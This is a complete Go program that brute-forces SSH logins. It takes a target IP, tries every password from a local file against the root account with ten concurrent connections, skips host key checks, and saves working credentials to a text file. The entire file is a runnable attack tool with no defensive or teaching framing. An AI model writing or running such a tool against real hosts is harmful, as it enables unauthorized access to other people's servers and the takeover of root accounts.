package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

// sshConnect attempts to connect to the host using the provided username and password.
func sshConnect(host, username, password string) {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	client, err := ssh.Dial("tcp", host+":22", config)
	if err != nil {
		if strings.Contains(err.Error(), "unable to authenticate") {
			fmt.Printf("Username - %s and Password - %s is Incorrect.\n", username, password)
		} else {
			fmt.Println("**** Attempting to connect - Rate limiting on server ****")
		}
		return
	}
	defer client.Close()

	fmt.Printf("Username - %s and Password - %s found.\n", username, password)
	f, err := os.OpenFile("credentials_found.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()

	if _, err := f.WriteString(fmt.Sprintf("Username: %s\nPassword: %s\nWorked on host %s\n", username, password, host)); err != nil {
		log.Fatal(err)
	}
}

// getIPAddress prompts the user for a valid IP address.
func getIPAddress() string {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("Please enter the host ip address: ")
		host, _ := reader.ReadString('\n')
		host = strings.TrimSpace(host)
		if net.ParseIP(host) != nil {
			return host
		}
		fmt.Println("Please enter a valid ip address.")
	}
}

// main is the entry point of the program.
// It reads passwords from a file and attempts to establish SSH connections using each password.
// The program limits the number of concurrent connections to 10.
// It uses the getIPAddress function to retrieve the host IP address.
// The SSH connections are established using the sshConnect function.
// The program waits for all goroutines to complete before exiting.
func main() {
	host := getIPAddress()
	file, err := os.Open("p.txt") // Open the passwords file
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	var wg sync.WaitGroup          // Define WaitGroup outside the loop
	sem := make(chan struct{}, 10) // Limit to 10 concurrent connections

	for scanner.Scan() {
		password := scanner.Text() // Read each line as a password

		wg.Add(1) // Increment the WaitGroup counter for each goroutine
		go func(password string) {
			defer wg.Done()                    // Decrement the counter when the goroutine completes
			sem <- struct{}{}                  // Acquire a token
			defer func() { <-sem }()           // Release the token
			sshConnect(host, "root", password) // Use "root" as the username
			time.Sleep(200 * time.Millisecond) // Leave a small time between starting a new connection thread.
		}(password)
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}

	wg.Wait() // Wait for all goroutines to complete
}
